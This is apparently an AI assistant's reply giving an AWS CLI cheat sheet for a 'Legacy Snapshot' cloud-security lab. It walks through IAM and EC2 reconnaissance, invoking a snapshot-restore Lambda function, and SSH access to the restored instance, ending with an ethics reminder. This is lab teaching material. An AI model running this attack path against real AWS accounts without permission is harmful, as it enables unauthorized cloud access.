Sure, here's a cheat sheet with the essential AWS CLI commands you'll need to complete the "Legacy Snapshot" scenario:

**Reconnaissance:**
```
# List IAM users
aws iam list-users

# List policies attached to the "ls-user"
aws iam list-attached-user-policies --user-name ls-user

# List available EC2 snapshots
aws ec2 describe-snapshots

# List available Lambda functions
aws lambda list-functions
```

**Identify Lambda Function Permissions:**
```
# Get the policy document for the Lambda invoke policy
aws iam get-policy-version --policy-arn <lambda_invoke_policy_arn> --version-id <version>
```

**Invoke the Lambda Function:**
```
# Invoke the Lambda function and save the output to a file
aws lambda invoke --function-name RestoreSnapshot output.txt

# View the output from the Lambda function (should contain the new instance ID)
cat output.txt
```

**Access the Restored Instance:**
```
# Connect to the restored EC2 instance using the provided key pair
ssh -i <path_to_key_pair> ec2-user@<instance_public_ip>
```

Make sure to replace the placeholders (`<lambda_invoke_policy_arn>`, `<version>`, `<path_to_key_pair>`, and `<instance_public_ip>`) with the actual values from your environment.

Additionally, you may need to perform further reconnaissance or gather information based on the scenario's flow and your findings during the exploitation process.

Remember, this cheat sheet is tailored for the "Legacy Snapshot" scenario, and the commands assume you have the necessary permissions and resources set up correctly. Always follow ethical guidelines and only perform security testing on systems you have explicit permission to test.